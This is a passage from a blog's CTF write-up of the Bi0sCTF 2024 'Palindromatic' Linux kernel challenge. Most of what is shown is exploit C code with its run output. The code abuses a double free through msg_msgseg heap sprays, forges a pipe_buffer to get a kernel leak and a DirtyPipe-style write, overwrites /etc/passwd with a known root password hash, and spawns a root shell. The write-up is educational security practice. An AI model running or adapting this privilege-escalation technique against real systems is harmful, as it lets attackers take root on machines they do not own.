+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[i], <span style="color:#f92672">&amp;</span>leak, <span style="color:#66d9ef">sizeof</span>(secondary_msg) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>, MSG_COPY <span style="color:#f92672">|</span> IPC_NOWAIT) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msgrcv failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (leak[<span style="color:#ae81ff">0x1ff</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x5a5a5a5a5a5a5a5a</span>) {
+</span></span><span style="display:flex;"><span>            overlap <span style="color:#f92672">=</span> i; 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Found overlapping object at index %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, overlap); 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>fake_pipe, <span style="color:#f92672">&amp;</span>leak[<span style="color:#ae81ff">0x1ff</span>], <span style="color:#66d9ef">sizeof</span>(fake_pipe)); 
+</span></span><span style="display:flex;"><span>            fake_pipe.flags <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>; 
+</span></span><span style="display:flex;"><span>            fake_pipe.offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>            fake_pipe.len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake pipe_buffer object:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">sizeof</span>(fake_pipe)<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>); j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;    0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fake_pipe)[j]); 
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>; 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Now, we free that one specific corrupted msg_msgseg object over the victim object, and spray the fake pipe_buffer object via msg_msgseg:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Free that one specific message</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[overlap], <span style="color:#f92672">&amp;</span>leak, <span style="color:#66d9ef">sizeof</span>(secondary_msg)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> msg[<span style="color:#ae81ff">0x1500</span>]; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(msg)); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>(msg[<span style="color:#ae81ff">0xff8</span>]), <span style="color:#f92672">&amp;</span>fake_pipe, <span style="color:#66d9ef">sizeof</span>(fake_pipe)); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spray new msg_msgseg objects with fake pipe_buffers</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>secondary_msg, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(secondary_msg));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>secondary_msg, <span style="color:#f92672">&amp;</span>msg, <span style="color:#66d9ef">sizeof</span>(secondary_msg)); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying msg_msgseg over victim object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_msg.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_msg.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_msg.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>secondary_msg, <span style="color:#66d9ef">sizeof</span>(secondary_msg) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p>We can then write our new password for the root user into the pipe:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Overwrite /etc/passwd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The creds are root:catcatcat
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> catcatcat[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root:$1$KHAVTUKO$GU3BysPeNf8W7hDrzo0bu/:0:0:root:/root:/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">user:x:1000:1000:Linux User,,,:/home/user:/bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(pipefd[corrupted][<span style="color:#ae81ff">1</span>], catcatcat, <span style="color:#66d9ef">sizeof</span>(catcatcat));
+</span></span></code></pre></div><p>Now check that the write has succeeded, call fork, open a shell, and profit!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> content[<span style="color:#ae81ff">0x80</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>content, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(content)); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Check contents of /etc/passwd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read</span>(passwd, content, <span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] read failed&#34;</span>);        
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, content);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Log in with root:catcatcat</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fork</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, NULL);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>When the exploit is run:</p>
+<pre tabindex="0"><code>~ $ /exploit 
+STAGE 0: SETUP
+[+] Initial setup
+[+] FD limit set to 4096
+[+] Setting up msg queues
+[+] Set up pipe_buf stuff
+[+] Opening device
+[+] Opening target file /etc/passwd
+STAGE 1: TRIGGER DOUBLE FREE
+[+] Do queue 0x100 times
+[+] Do process 0x30 times
+[+] Do sanitize
+[+] Do process 0x10 times
+[+] Offset: 7
+[+] Do reset to move corrupted request into incoming queue
+[+] Process all the other incoming requests
+STAGE 2: CROSS CACHE
+[+] Do reap to free all items in the outgoing queue
+[+] Spraying pipe_buf over freed 1024 area
+[+] Free a second time using reset
+[+] Spray another round of pipe_buf to replace double freed object
+[+] Find the corrupted pipe_buf object
+[+] Corrupted pipe index: 12
+[+] Free one of the two pipe_bufs over the victim
+[+] Spraying msg_msgseg over victim object
+[+] Splice pipe
+[+] Getting a leak of the pipe_buffer object
+[+] Found overlapping object at index 26
+[+] Fake pipe_buffer object:
+    0xffffdd34400caa40
+    0x0
+    0xffffffffb82205e0
+    0x10
+    0x0
+[+] Kernel text base: 0xffffffffb7000000
+STAGE 3: DIRTYPIPE
+[+] Free that one specific message
+[+] Spray new msg_msgseg objects with fake pipe_buffers
+[+] Spraying msg_msgseg over victim object
+[+] Overwrite /etc/passwd
+[+] Check contents of /etc/passwd
+root:$1$KHAVTUKO$GU3BysPeNf8W7hDrzo0bu/:0:0:root:/root:/bin/sh
+user:x:1000:1000:
+[+] Log in with root:catcatcat
+~ $ cat /etc/passwd
+root:$1$KHAVTUKO$GU3BysPeNf8W7hDrzo0bu/:0:0:root:/root:/bin/sh
+user:x:1000:1000:~ 
+~ $ su root
+Password: 
+/ # whoami
+root
+/ # id
+uid=0(root) gid=0(root) groups=0(root)
+/ # YAY :D
+</code></pre><p>The challenge files and the full exploit can be obtained here: <a href="https://github.com/KaligulaArmblessed/Practice_Exploits/tree/main/Palindromatic_Bi0sCTF2024">https://github.com/KaligulaArmblessed/Practice_Exploits/tree/main/Palindromatic_Bi0sCTF2024</a></p>
+<p>I had a lot of fun learning about this cool technique with this challenge, special thanks to Team Bi0s and K1R4 for the wonderful challenge, and to everyone for reading :D</p>
+
+    <h4><a href="https://kaligulaarmblessed.github.io">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    Kaligula Armblessed
+
+<span id="thisyear">2024</span>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        
+        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 1 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
